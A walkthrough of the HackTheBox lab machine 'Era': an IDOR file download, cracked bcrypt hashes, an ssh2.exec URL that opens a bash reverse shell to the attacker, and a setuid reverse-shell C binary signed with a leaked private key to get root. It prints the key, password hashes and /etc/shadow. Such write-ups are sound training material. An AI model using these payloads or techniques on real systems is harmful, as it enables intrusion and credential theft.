---
title: Era
summary: "Full walkthrough of the retired machine Era from HackTheBox"
date: 2025-11-30
tag: htb-machines
permalink: /HackTheBox/Machines/Era.md
---

![](/images/posts/Era.png)
[https://app.hackthebox.com/machines/683](https://app.hackthebox.com/machines/683)

---

# Enumeration 
## `nmap` scan 

```bash
$nmap -sC -sV 10.10.11.79

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-26 20:40 +01
Nmap scan report for 10.10.11.79
Host is up (2.1s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
```

- There are FTP and  HTTP open ports 

## HTTP - 80
- opening http://era.htb/

![](/images/posts/era_1.png)

There is nothing interesting

### directories enumeration 

- I used `gobuster` tool to see if there is hidden directories 

```bash
gobuster dir -u http://era.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
===============================================================                              
Gobuster v3.6                                                                                
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                
===============================================================                              
[+] Url:                     http://era.htb/                                                 
[+] Method:                  GET                                                             
[+] Threads:                 10                                                              
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  
[+] Negative Status codes:   404                                                             
[+] User Agent:              gobuster/3.6                                                    
[+] Timeout:                 10s                                                             
===============================================================                              
Starting gobuster in directory enumeration mode                                              
===============================================================                              
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]                    
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]                  
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]                    
/index.html           (Status: 200) [Size: 19493]                                            
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]                       
Progress: 4723 / 4724 (99.98%)
```

No interesting  directories 

### subdomain enumeration 

- I used `ffuf` tool to enumerate subdomains 

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://era.htb/ -H "Host: FUZZ.era.htb" -fc 302                                                           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 3692ms]
```

There is `file.era.htb` subdomain 

## `file` subdomain 

- opening http://file.era.htb

![](/images/posts/era_100.png)

- there is `security_login.php` if the user forgot his password 

![](/images/posts/era_000007.png)

- I tried to use `security_login.php` to enumerate usernames , and I success , i found admin and test users 

>[!info]
>if the user is not found it return `user not found` and if the user found but another inputs if incorrect it return Incorrect answers

![](/images/posts/era_000006.png)

![](/images/posts/era_101.png)


- manually , I found `register.php` endpoint , I create my account then I sing in . it redirect me to `manae.php` 

![](/images/posts/era_000008.png)


- We can upload files , web shell not work 

![](/images/posts/era_102.png)

- But if we upload a file, it give us a URL to install it . I upload a file -> its URL http://file.era.htb/download.php?id=5280 . This endpoint use ID to download files so ,I thought maybe there is IDOR here 

>I use `Intruder` in burpsuite suite to enumerate if there are other available from server

![](/images/posts/era_000016.png)

I found : 
- the ID 0150 is a `signing.zip` 
	- it contains private ssh key and another .keygen file (may be we can use it after we get shell)
- the ID 0054 is `site-backup-30-08-24.zip`
	- it contains `sqlite` file 

- From the sqlite file , I found users table 

```bash
$ sqlite3 site-backup-30-08-24/filedb.sqlite "SELECT * FROM users;"
 
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```

- I tried to crack these hashes 

```bash
$ cat hashes.txt 

eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC

$ hashcat.exe -m 3200 --username hashes.txt rockyou.txt
```

>[!success] 
>real name of admin -> `admin_ef01cab31aa`
>Creds : 
>	- `yuri:mustang`
>	- `eric:america`

- I can log in FTP using <span style="color:rgb(255, 0, 0)">yuri</span> credentials 

```bash
$ ftp yuri@era.htb 
Connected to era.htb.
220 (vsFTPd 3.0.5) 
331 Please specify the password. 
Password: 
230 Login successful. 
Remote system type is UNIX. 
Using binary mode to transfer files. 
ftp>
```

## foothold 

- In FTP , there are extensions available to PHP like `ssh2.so` shared object library (indicated by the `.so` extension) that provides the SSH2 extension for PHP

```bash
ftp> ls 
229 Entering Extended Passive Mode (|||15465|) 
150 Here comes the directory listing.

drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
```

- Reviewing site backup we find interesting function in `downloads.php`

![](/images/posts/era_000020.png)

- If we are admin in `file.era.htb` we have access to this BETA function 
- If the `format` parameter contains `://`, the script assumes the user wants to use a PHP stream wrapper (e.g., `php://`, `file://`, `http://`) and sets the content type to `application/octet-stream`

- Now, we have to reset the security questions of admin login via [http://file.era.htb/security_login.php](http://file.era.htb/security_login.php)

![](/images/posts/era_103.png)

![](/images/posts/era_104.png)

- We already found in FTP `ssh2.so` , and it have capability to RCE through `ssh2_exec`  

>[!info]
>https://www.php.net/manual/en/wrappers.ssh2.php
>https://www.php.net/manual/en/wrappers.php

- Since we can access FTP we know `yuri` is a valid system account so let’s test a reverse shell

```bash
http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.183/3535%200%3E%261%22;
```

- In my listener , I got reverse shell 

![](/images/posts/era_000022.png)

- I upgrade shell using 

```bash
yuri@era:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
yuri@era:~$ ^Z
[1]+  Stopped                 nc -lnvp 4444

$stty raw -echo; fg
nc -lnvp 4444

yuri@era:~$ 
```

# Post-exploitation 

- I found `eric` 

```bash
yuri@era:~$ cat /etc/passwd

usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
eric:x:1000:1000:eric:/home/eric:/bin/bash
ftp:x:108:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
yuri:x:1001:1002::/home/yuri:/bin/sh
_laurel:x:999:999::/var/log/laurel:/bin/false
```

- We already have password of `eric`

![](/images/posts/era_000023.png)

- current user : 
```bash
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
eric@era:~$ sudo -l
[sudo] password for eric: 
Sorry, user eric may not run sudo on era.
```
> - it is not has root privilege
> - it is in `devs` group


- Process 
```bash
root        7193  0.0  0.0   2892  1040 ?        Ss   19:54   0:00 /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
root        7195  0.0  0.0   4784  3316 ?        S    19:54   0:00 /bin/bash /root/initiate_monitoring.sh
root        7206  0.0  0.0    984   608 ?        S    19:54   0:00 /opt/AV/periodic-checks/monitor
```

- File enum reveals unusual files in /opt

```bash
eric@era:~$ cd /opt/AV/periodic-checks
 
eric@era:/opt/AV/periodic-checks$ ls -la
total 32
drwxrwxr-- 2 root devs  4096 Jul 27 06:06 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrw---- 1 root devs 16544 Jul 27 06:06 monitor
-rw-rw---- 1 root devs   103 Jul 27 06:06 status.log
```

we have permission on this files , we can replace the binary file (monitor)
## Privilege escalation \_kernel signing\_

>https://docs.kernel.org/admin-guide/module-signing.html

First, I considered replacing the screen with a malicious one and wait for root to trigger, but then the log file showed that file tampering had been detected, and a "signed executable" file was expected. Here when the signing.zip file is useful

>[!info] About signing.zip
>Signing an x509.genkey file in the context of kernel module signing involves using the `openssl` command to generate a key pair (private and public key) based on the configuration in the `x509.genkey` file. This process creates a public key that is embedded in the kernel and a private key used to sign kernel modules.

- In your local machine do make a file monitor.c

```bash
$ cat monitor.c         
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.15.1/7777 0>&1", NULL);
    return 0;
}
```


```
$ gcc monitor.c -o monitorX
```

- To sign this we need to (linux elf binary singer)

```bash
$ git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
$ cd linux-elf-binary-signer
$ make clean
$ gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
```

- Content of signing.zip

```bash
$ cat signing/x509.genkey
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
prompt = no
string_mask = utf8only
x509_extensions = myexts
 
[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com
 
[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid
 
$ cat signing/key.pem
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCqKH30+RZjkxiV
JMnuB6b1dDbWUaw3p2QyQvWMbFvsi7zG1kE2LBrKjsEyvcxo8m0wL9feuFiOlciD
MamELMAW0UjMyew01+S+bAEcOawH81bVahxNkA4hHi9d/rysTe/dnNkh08KgHhzF
mTApjbV0MQwUDOLXSw9eHd+1VJClwhwAsL4xdk4pQS6dAuJEnx3IzNoQ23f+dPqT
CMAAWST67VPZjSjwW1/HHNi12ePewEJRGB+2K+YeGj+lxShW/I1jYEHnsOrliM2h
ZvOLqS9LjhqfI9+Q1RxIQF69yAEUeN4lYupa0Ghr2h96YLRE5YyXaBxdSA4gLGOV
HZgMl2i/AgMBAAECggEALCO53NjamnT3bQTwjtsUT9rYOMtR8dPt1W3yNX2McPWk
wC2nF+7j+kSC0G9UvaqZcWUPyfonGsG3FHVHBH75S1H54QnGSMTyVQU+WnyJaDyS
+2R9uA8U4zlpzye7+LR08xdzaed9Nrzo+Mcuq7DTb7Mjb3YSSAf0EhWMyQSJSz38
nKOcQBQhwdmiZMnVQp7X4XE73+2Wft9NSeedzCpYRZHrI820O+4MeQrumfVijbL2
xx3o0pnvEnXiqbxJjYQS8gjSUAFCc5A0fHMGmVpvL+u7Sv40mj/rnGvDEAnaNf+j
SlC9KdF5z9gWAPii7JQtTzWzxDinUxNUhlJ00df29QKBgQDsAkzNjHAHNKVexJ4q
4CREawOfdB/Pe0lm3dNf5UlEbgNWVKExgN/dEhTLVYgpVXJiZJhKPGMhSnhZ/0oW
gSAvYcpPsuvZ/WN7lseTsH6jbRyVgd8mCF4JiCw3gusoBfCtp9spy8Vjs0mcWHRW
PRY8QbMG/SUCnUS0KuT1ikiIYwKBgQC4kkKlyVy2+Z3/zMPTCla/IV6/EiLidSdn
RHfDx8l67Dc03thgAaKFUYMVpwia3/UXQS9TPj9Ay+DDkkXsnx8m1pMxV0wtkrec
pVrSB9QvmdLYuuonmG8nlgHs4bfl/JO/+Y7lz/Um1qM7aoZyPFEeZTeh6qM2s+7K
kBnSvng29QKBgQCszhpSPswgWonjU+/D0Q59EiY68JoCH3FlYnLMumPlOPA0nA7S
4lwH0J9tKpliOnBgXuurH4At9gsdSnGC/NUGHII3zPgoSwI2kfZby1VOcCwHxGoR
vPqt3AkUNEXerkrFvCwa9Fr5X2M8mP/FzUCkqi5dpakduu19RhMTPkdRpQKBgQCJ
tU6WpUtQlaNF1IASuHcKeZpYUu7GKYSxrsrwvuJbnVx/TPkBgJbCg5ObFxn7e7dA
l3j40cudy7+yCzOynPJAJv6BZNHIetwVuuWtKPwuW8WNwL+ttTTRw0FCfRKZPL78
D/WHD4aoaKI3VX5kQw5+8CP24brOuKckaSlrLINC9QKBgDs90fIyrlg6YGB4r6Ey
4vXtVImpvnjfcNvAmgDwuY/zzLZv8Y5DJWTe8uxpiPcopa1oC6V7BzvIls+CC7VC
hc7aWcAJeTlk3hBHj7tpcfwNwk1zgcr1vuytFw64x2nq5odIS+80ThZTcGedTuj1
qKTzxN/SefLdu9+8MXlVZBWj
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIUbWNKqYHhk6HkSMUgX/ebhOa29QswDQYJKoZIhvcNAQEL
BQAwTzERMA8GA1UECgwIRXJhIEluYy4xGTAXBgNVBAMMEEVMRiB2ZXJpZmljYXRp
b24xHzAdBgkqhkiG9w0BCQEWEHl1cml2aWNoQGVyYS5jb20wIBcNMjUwMTI2MDIw
OTM1WhgPMjEyNTAxMDIwMjA5MzVaME8xETAPBgNVBAoMCEVyYSBJbmMuMRkwFwYD
VQQDDBBFTEYgdmVyaWZpY2F0aW9uMR8wHQYJKoZIhvcNAQkBFhB5dXJpdmljaEBl
cmEuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqih99PkWY5MY
lSTJ7gem9XQ21lGsN6dkMkL1jGxb7Iu8xtZBNiwayo7BMr3MaPJtMC/X3rhYjpXI
gzGphCzAFtFIzMnsNNfkvmwBHDmsB/NW1WocTZAOIR4vXf68rE3v3ZzZIdPCoB4c
xZkwKY21dDEMFAzi10sPXh3ftVSQpcIcALC+MXZOKUEunQLiRJ8dyMzaENt3/nT6
kwjAAFkk+u1T2Y0o8FtfxxzYtdnj3sBCURgftivmHho/pcUoVvyNY2BB57Dq5YjN
oWbzi6kvS44anyPfkNUcSEBevcgBFHjeJWLqWtBoa9ofemC0ROWMl2gcXUgOICxj
lR2YDJdovwIDAQABozwwOjAMBgNVHRMBAf8EAjAAMAsGA1UdDwQEAwIHgDAdBgNV
HQ4EFgQU/XYF/LzWBMr+NhZw/PHUlQHb0s0wDQYJKoZIhvcNAQELBQADggEBAAzE
eNQxIJH6Z8vOvP8g1OoyD0Ot9E8U/PdxlM7QWqk9qcH0xyQZqg7Ee5L/kq4y/1i1
ZxAPlBfOUx4KhZgWVkStfvut0Ilg3VSXVntPPRi8WAcDV5nivYtphv16ZQkaclFy
dN0mYQc2NlqDv+y5FKnGbkioRUVGGmkIqeaT4HIUA2CFRnTr2Jao0TwAIG0jfpov
+y/t2WhUNto9L04vcD3ZAzuEPZnqs/L9rsoDZ1Ee3DxnOC7l3PkklaIiDrXiHAkd
Nrg7N9XCeQr0FUS0xLMBMVCEJT2TCo6lXKtcI5A5FgAcyECDzkw+HdgSYFPaoYJq
5rxH+xhuDqRDr941Sg4=
-----END CERTIFICATE-----
```

- signing binary file

```bash
$ ./elf-sign sha256 key.pem key.pem monitorX                                                                                                                                           
 --- 64-bit ELF file, version 1 (CURRENT), little endian.                                                                                                                                  
 --- 31 sections detected.                                                                                                                                                                    
 --- [Library dependency]: libc.so.6                                                                                                                                                          
 --- Section 0015 [.text] detected.                                                                                                                                                           
 --- Length of section [.text]: 320                                                                                                                                                           
 --- Signature size of [.text]: 458                                                                                                                                                           
 --- Writing signature to file: .text_sig                                                                                                                                                     
 --- Removing temporary signature file: .text_sig
```

- upload `monitorX` into this directory `/opt/AV/periodic-checks`

```bash
eric@era:/opt/AV/periodic-checks$ wget http://<YOUR_IP>:8000/monitorX
eric@era:/opt/AV/periodic-checks$ rm monitor
eric@era:/opt/AV/periodic-checks$ mv monitorX monitor
eric@era:/opt/AV/periodic-checks$ chmod +x monitor
```

- And in my local machine listener , I got reverse shell as root

```bash
$ nc -lnvp 7777                            
Listening on 0.0.0.0 7777                      
Connection received on 10.10.11.79 45354                                                       
bash: cannot set terminal process group (14243): Inappropriate ioctl for device                
bash: no job control in this shell             
root@era:~# id                                 
id                                             
uid=0(root) gid=0(root) groups=0(root)

root@era:~# cat /etc/shadow
cat /etc/shadow
 
root:$y$j9T$KS466bqZgScjpShqW.M5R.$ZJiDypD1.tHrT5D3AeWhnsIUp2rIrTnkRp4jrV5TjgB:19983:0:99999:7:::
daemon:*:19977:0:99999:7:::
bin:*:19977:0:99999:7:::
sys:*:19977:0:99999:7:::
sync:*:19977:0:99999:7:::
games:*:19977:0:99999:7:::
man:*:19977:0:99999:7:::
lp:*:19977:0:99999:7:::
mail:*:19977:0:99999:7:::
news:*:19977:0:99999:7:::
uucp:*:19977:0:99999:7:::
proxy:*:19977:0:99999:7:::
www-data:*:19977:0:99999:7:::
backup:*:19977:0:99999:7:::
list:*:19977:0:99999:7:::
irc:*:19977:0:99999:7:::
gnats:*:19977:0:99999:7:::
nobody:*:19977:0:99999:7:::
_apt:*:19977:0:99999:7:::
systemd-network:*:19977:0:99999:7:::
systemd-resolve:*:19977:0:99999:7:::
messagebus:*:19977:0:99999:7:::
systemd-timesync:*:19977:0:99999:7:::
pollinate:*:19977:0:99999:7:::
usbmux:*:19983:0:99999:7:::
sshd:*:19983:0:99999:7:::
eric:$6$.ki8iFVEyU3nItnU$hbR6van4JaXfZTkvXIynNfMIZMp4YCeU9f/jRR4xfdtCOceIJxwDHKrKyjMZtb2juxWsE6GcHJQAxfat7m12a/:19983:0:99999:7:::
ftp:*:20065:0:99999:7:::
yuri:$y$j9T$nb4GkUIQQFAvxZEOhZ0Dk0$WvwIZQLgnstRTdMheX1tug.aHi0TrwGcFJB93k8DcA6:20268:0:99999:7:::
_laurel:!:20271::::::
```

![](/images/posts/Era_Pwned.png)